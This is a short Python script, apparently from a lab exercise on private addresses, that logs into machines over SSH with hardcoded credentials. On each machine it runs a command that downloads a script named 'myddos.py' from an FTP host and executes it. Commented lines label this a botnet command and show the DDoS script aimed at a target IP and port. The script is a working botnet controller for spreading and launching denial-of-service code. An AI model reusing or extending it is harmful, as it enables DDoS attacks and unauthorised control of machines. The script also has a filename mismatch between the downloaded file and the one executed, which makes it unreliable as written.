import paramiko
import sys

def sshclient(host,user,passw, cmd):
    s = paramiko.SSHClient()
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        s.connect(hostname=host, username=user, password=passw)
    except Exception as e:
        print(e)
        print("连接出现错误！")
        sys.exit()

    stdin,stdout,stderr=s.exec_command(cmd)
    result=stdout.read()
    print(str(result,encoding='utf-8'))
    s.close()

if __name__=='__main__':
    mysql={
        "192.168.95.129":{
            "user":"linuxcc",
            "passw":"linuxcc",
            "cmd":"wget ftp://192.168.95.128/myddos.py -o myddos1.py\npython3 myddos.py"
        }#,
        #"192.168.95.129": {
        #   "user": "linuxcc",
        #    "passw": "linuxcc",
        #    "cmd": ""
        #},
    }
    #botnet_command('wget ftp://192.168.95.128/myddos.py -o myddos.py')
    #botnet_command('python3 myddos.py 192.168.95.132 21 abc 100')
    for ip_key,v in mysql.items():
        sshclient(host=ip_key, user=v.get("user"), passw=v.get("passw"), cmd=v.get("cmd"))
    print("ok")